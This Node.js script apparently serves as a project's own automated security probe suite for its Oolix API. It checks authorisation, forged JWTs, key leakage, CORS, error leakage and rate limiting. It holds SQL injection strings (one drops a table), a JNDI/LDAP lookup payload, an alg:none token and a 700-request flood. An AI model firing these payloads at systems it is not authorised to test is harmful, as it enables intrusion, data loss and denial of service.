#!/usr/bin/env node
/**
 * Adversarial probes against a RUNNING Oolix API.
 *
 * This is not a substitute for a penetration test by someone who does it for a
 * living. It is the part that can be automated and repeated: the checks that
 * should never regress, run against a live instance rather than reasoned about
 * from the source.
 *
 * The difference from the existing test suite matters. The suite asserts that
 * the product does what it should; this asserts that it refuses what it
 * should, from the outside, with no credentials and no cooperation.
 *
 *   node scripts/pen-probe.mjs --base http://127.0.0.1:4000
 *
 * ONLY run this against an instance you are authorised to test. It sends
 * deliberately malformed and hostile requests.
 */
import { parseArgs } from 'node:util';

const { values } = parseArgs({
  options: {
    base: { type: 'string', default: 'http://127.0.0.1:4000' },
    verbose: { type: 'boolean', default: false },
  },
});
const BASE = values.base.replace(/\/$/, '');

const results = [];
function record(name, severity, passed, detail) {
  results.push({ name, severity, passed, detail });
}

async function req(path, init = {}) {
  try {
    const res = await fetch(BASE + path, { redirect: 'manual', ...init });
    const text = await res.text();
    return { status: res.status, headers: res.headers, text };
  } catch (err) {
    return { status: 0, headers: new Headers(), text: String(err), error: true };
  }
}

/**
 * A rate-limited probe tested nothing.
 *
 * Counting a 429 as a refusal is a false pass -- the guard under test was never
 * reached. Counting it as an answer is a false failure. Either way the run is
 * inconclusive, and saying so is the only honest option: the flood probe
 * deliberately exhausts the anonymous budget, so a second run inside the same
 * minute would otherwise report a wall of fabricated criticals.
 */
function throttled(r) {
  return r.status === 429;
}

/**
 * Wait out a rate-limit window before starting.
 *
 * Section 13 deliberately floods the per-IP budget, and the authenticated
 * suite shares it -- the limiter runs before authentication (§94), so a
 * signed-in request counts against the same allowance. Running either suite
 * shortly after the other would otherwise report a wall of INCONCLUSIVE:
 * honest, and useless. The window is a rolling 60 seconds, so waiting once at
 * the start is enough.
 */
async function waitOutAnyThrottle() {
  const r = await req('/v1/me/context');
  if (r.status !== 429) return;

  // A FULL window, not a poll for the first free slot. §94's limit is a
  // rolling 60 seconds, so the moment one slot frees there is still almost no
  // headroom -- a suite that starts there exhausts it again within seconds and
  // reports a wall of INCONCLUSIVE.
  console.log('  (rate limited from a previous run; waiting 65s for the window to clear)');
  await new Promise((resolve) => setTimeout(resolve, 65_000));
}

await waitOutAnyThrottle();

// ---------------------------------------------------------------------------
// 1. Protected routes must refuse an anonymous caller.
//
// The failure this catches is a route added without its guard. It is the most
// common way an authorisation model develops a hole: not by being wrong, but
// by not being applied.
// ---------------------------------------------------------------------------
const PROTECTED = [
  '/v1/me/context',
  '/v1/organizations',
  '/v1/organizations/members',
  '/v1/partner/profile',
  '/v1/partner/readiness',
  '/v1/partner/segments',
  '/v1/campaigns',
  '/v1/audiences',
  '/v1/partner/agents',
  '/v1/billing/invoices',
  // The external-channel surface. A connection listing names a Partner's ad
  // accounts, and the eligibility endpoint would let a stranger probe which
  // Partners are connected to which platforms.
  '/v1/channel-connections',
  '/v1/channel-connections/META',
];

for (const path of PROTECTED) {
  const r = await req(path);
  // 401/403 are correct. 404 is acceptable only if the route genuinely does
  // not exist; anything 2xx means it answered a stranger.
  const ok = r.status === 401 || r.status === 403 || r.status === 404;
  record(
    `anonymous GET ${path}`,
    'critical',
    ok,
    throttled(r)
      ? 'INCONCLUSIVE: rate limited before the guard could be reached'
      : ok
        ? `refused with ${r.status}`
        : `ANSWERED with ${r.status}`,
  );
}

// ---------------------------------------------------------------------------
// 2. A forged or malformed bearer token must not be accepted.
// ---------------------------------------------------------------------------
for (const token of [
  'Bearer not-a-token',
  'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.', // alg:none
  'Bearer ' + 'A'.repeat(2000),
]) {
  const r = await req('/v1/me/context', { headers: { Authorization: token } });
  const ok = r.status === 401 || r.status === 403;
  record(
    `forged token (${token.slice(7, 30)}...)`,
    'critical',
    ok,
    throttled(r)
      ? 'INCONCLUSIVE: rate limited before the guard could be reached'
      : ok
        ? `refused with ${r.status}`
        : `ACCEPTED with ${r.status}`,
  );
}

// ---------------------------------------------------------------------------
// 3. The published JWKS must never carry private key material.
//
// One leaked `d` and anyone can sign a manifest that every Partner Agent will
// believe. This is the highest-consequence single failure in the system.
// ---------------------------------------------------------------------------
{
  const r = await req('/.well-known/oolix-manifest-jwks.json');
  let leaked = false;
  try {
    const body = JSON.parse(r.text);
    leaked = (body.keys ?? []).some((k) => 'd' in k || 'p' in k || 'q' in k);
  } catch {
    leaked = /"d"\s*:/.test(r.text);
  }
  record(
    'manifest JWKS carries no private key',
    'critical',
    !leaked,
    leaked ? 'PRIVATE MATERIAL PRESENT' : 'public parameters only',
  );
}

// ---------------------------------------------------------------------------
// 4. Errors must not leak internals.
//
// A stack trace names file paths, framework versions and query structure --
// the reconnaissance that makes the next attempt cheaper.
// ---------------------------------------------------------------------------
{
  const probes = [
    ['/v1/campaigns/not-a-uuid', {}],
    ['/v1/audiences/%00', {}],
    ['/v1/me/context', { method: 'POST', body: '{"broken":' }],
  ];
  for (const [path, init] of probes) {
    const r = await req(path, init);
    const leaks = /at .*\.(ts|js):[0-9]+|node_modules|PrismaClient|SELECT .* FROM|C:\\\\/i.test(
      r.text,
    );
    record(
      `no internals in error for ${path}`,
      'high',
      !leaks,
      leaks ? `LEAKED: ${r.text.slice(0, 120)}` : `clean ${r.status}`,
    );
  }
}

// ---------------------------------------------------------------------------
// 5. SQL injection against anything that reaches a query.
//
// Prisma parameterises, so this should be uneventful -- which is exactly why
// it is worth asserting: the codebase does contain raw SQL, and the next one
// added might interpolate.
// ---------------------------------------------------------------------------
{
  const payloads = [
    "' OR '1'='1",
    "'; DROP TABLE campaigns; --",
    "1' UNION SELECT NULL,NULL--",
    '${jndi:ldap://x/a}',
  ];
  for (const p of payloads) {
    const r = await req(`/v1/campaigns?status=${encodeURIComponent(p)}`);
    // Unauthenticated, so 401 is the expected answer. What must never happen
    // is a 500: that means the string reached something that tried to run it.
    const ok = r.status !== 500;
    record(
      `injection payload rejected cleanly (${p.slice(0, 18)})`,
      'critical',
      ok,
      `status ${r.status}`,
    );
  }
}

// ---------------------------------------------------------------------------
// 6. CORS must not trust an arbitrary origin.
//
// A permissive ACAO plus credentials lets any site read a signed-in user's
// data using their own session.
// ---------------------------------------------------------------------------
{
  const r = await req('/v1/me/context', {
    method: 'OPTIONS',
    headers: {
      Origin: 'https://evil.example',
      'Access-Control-Request-Method': 'GET',
    },
  });
  const allow = r.headers.get('access-control-allow-origin');
  const creds = r.headers.get('access-control-allow-credentials');
  const bad = allow === 'https://evil.example' || (allow === '*' && creds === 'true');
  record(
    'CORS does not reflect an arbitrary origin',
    'critical',
    !bad,
    `allow-origin=${allow ?? 'none'} credentials=${creds ?? 'none'}`,
  );
}

// ---------------------------------------------------------------------------
// 8. An oversized body must be refused, not buffered.
// ---------------------------------------------------------------------------
{
  const r = await req('/v1/campaigns', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'x'.repeat(5_000_000) }),
  });
  const ok = r.status === 413 || r.status === 400 || r.status === 401 || r.status === 429;
  record('oversized body refused', 'medium', ok, `status ${r.status}`);
}

// ---------------------------------------------------------------------------
// 9. No response may contain a per-person identifier.
//
// The product's central claim is that Oolix never learns who anyone is. A
// field named for a partner's user on any endpoint would contradict it.
// ---------------------------------------------------------------------------
{
  const surfaces = ['/healthz', '/readyz', '/.well-known/oolix-manifest-jwks.json', '/metrics'];
  for (const path of surfaces) {
    const r = await req(path);
    const found = /partner_user_id|customer_id|msisdn|email/i.test(r.text);
    record(
      `no per-person identifier in ${path}`,
      'critical',
      !found,
      found ? 'IDENTIFIER-SHAPED FIELD PRESENT' : 'clean',
    );
  }
}

// ---------------------------------------------------------------------------
// 10. Dangerous HTTP methods.
// ---------------------------------------------------------------------------
{
  // Raw sockets, not fetch. `fetch` refuses to send TRACE and CONNECT at all,
  // so asking it to produced a failure that described the probe rather than
  // the server -- a test that cannot pass is worse than no test, because it
  // trains people to ignore the report.
  const { connect } = await import('node:net');
  const url = new URL(BASE);

  async function rawRequest(line) {
    return new Promise((resolve) => {
      const socket = connect({ host: url.hostname, port: Number(url.port || 80) }, () =>
        socket.write(`${line}
Host: ${url.host}
Connection: close

`),
      );
      let data = '';
      const done = (v) => {
        socket.destroy();
        resolve(v);
      };
      socket.setTimeout(5000, () => done(data));
      socket.on('data', (chunk) => {
        data += chunk;
      });
      socket.on('end', () => done(data));
      socket.on('error', () => done(''));
    });
  }

  for (const method of ['TRACE', 'TRACK']) {
    const raw = await rawRequest(`${method} /healthz HTTP/1.1`);
    const status = Number(/^HTTP\/1\.[01] ([0-9]{3})/.exec(raw)?.[1] ?? 0);
    // A 200 to TRACE reflects the request back, which is how Cross-Site
    // Tracing turns an HttpOnly cookie into a readable one.
    const ok = status !== 200;
    record(`${method} not served`, 'low', ok, status ? `status ${status}` : 'connection refused');
  }
}

// ---------------------------------------------------------------------------
// 11. Version and framework disclosure.
// ---------------------------------------------------------------------------
{
  const r = await req('/healthz');
  const server = r.headers.get('server');
  const powered = r.headers.get('x-powered-by');
  const bad = Boolean(powered) || (server && /fastify|express|node/i.test(server));
  record(
    'no framework disclosure in headers',
    'low',
    !bad,
    `server=${server ?? 'none'} x-powered-by=${powered ?? 'none'}`,
  );
}

// ---------------------------------------------------------------------------
// 12. The external-channel surface must not become a credential store.
//
// §17 keeps ingestion credentials inside the Partner Agent. The connection API
// is where a well-meaning integration would post an access token alongside the
// account ids, and a permissive schema would quietly put a long-lived platform
// credential in the database, the backups, and anything that dumps a row.
// ---------------------------------------------------------------------------
{
  const withCredential = JSON.stringify({
    account_ids: { ad_account_id: 'act-1', access_token: 'EAAG-a-real-looking-token' },
    scopes: ['ads_management'],
  });

  const r = await req('/v1/channel-connections/META', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: withCredential,
  });

  // Unauthenticated, so 401 is expected here -- what must never happen is a
  // 2xx. The schema-level refusal is asserted by the unit tests; this checks
  // the endpoint is not reachable without credentials in the first place.
  const ok = r.status !== 200 && r.status !== 201;
  record(
    'channel connection endpoint refuses an anonymous write',
    'critical',
    ok,
    `status ${r.status}`,
  );
}

{
  // An eligibility check is a state-changing operation: it can sign a manifest
  // and take an activation live. A stranger must not be able to run one.
  const r = await req('/v1/activations/00000000-0000-4000-8000-000000000001/eligibility-check', {
    method: 'POST',
  });
  const ok = r.status === 401 || r.status === 403 || r.status === 404;
  record(
    'anonymous eligibility check is refused',
    'critical',
    ok,
    throttled(r)
      ? 'INCONCLUSIVE: rate limited'
      : ok
        ? `refused with ${r.status}`
        : `ANSWERED with ${r.status}`,
  );
}

{
  // The Agent-facing report moves an activation to LIVE or ENDED. Reaching it
  // without an agent assertion would let anyone end a campaign.
  const r = await req('/agent/v1/channel-status', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      activation_id: '00000000-0000-4000-8000-000000000001',
      provider: 'META',
      status: 'REMOVED',
    }),
  });
  const ok = r.status === 401 || r.status === 403 || r.status === 404;
  record(
    'anonymous channel-status report is refused',
    'critical',
    ok,
    throttled(r)
      ? 'INCONCLUSIVE: rate limited'
      : ok
        ? `refused with ${r.status}`
        : `ACCEPTED with ${r.status}`,
  );
}

// ---------------------------------------------------------------------------
// 13. Rate limiting (§94) has to actually bite.
//
// LAST, on purpose. It deliberately exhausts the anonymous per-IP budget,
// so anything after it would be rate limited before reaching the guard it
// was testing -- reported as INCONCLUSIVE, which is honest but useless.
// ---------------------------------------------------------------------------
{
  // Above RATE_LIMITS.anonymousIp (600/min). An earlier version of this probe
  // sent 150 and reported a pass -- not because anything was limited, but
  // because it never reached the bound. A probe that cannot fail is not a
  // probe.
  const BURST = 700;
  const burst = await Promise.all(Array.from({ length: BURST }, () => req('/v1/me/context')));
  const limited = burst.filter((r) => r.status === 429).length;
  record(
    'unauthenticated flood is rate limited',
    'medium',
    limited > 0,
    limited > 0
      ? `${limited}/${BURST} rejected with 429`
      : `no 429 in ${BURST} requests: anonymous traffic is unbounded`,
  );
}

// ---------------------------------------------------------------------------
// Report
// ---------------------------------------------------------------------------
const order = { critical: 0, high: 1, medium: 2, low: 3 };
results.sort((a, b) => order[a.severity] - order[b.severity]);

let failed = 0;
console.log(`\nProbes against ${BASE}\n`);
for (const r of results) {
  if (!r.passed) failed += 1;
  if (!r.passed || values.verbose) {
    const mark = r.passed ? 'pass' : 'FAIL';
    console.log(`  [${mark}] ${r.severity.padEnd(8)} ${r.name}\n           ${r.detail}`);
  }
}

const bySeverity = {};
for (const r of results) {
  if (r.passed) continue;
  bySeverity[r.severity] = (bySeverity[r.severity] ?? 0) + 1;
}

console.log(`\n${results.length - failed}/${results.length} probes passed`);
if (failed) {
  console.log('failures by severity:', JSON.stringify(bySeverity));
  // Anything critical or high should stop a release.
  if (bySeverity.critical || bySeverity.high) process.exitCode = 1;
}
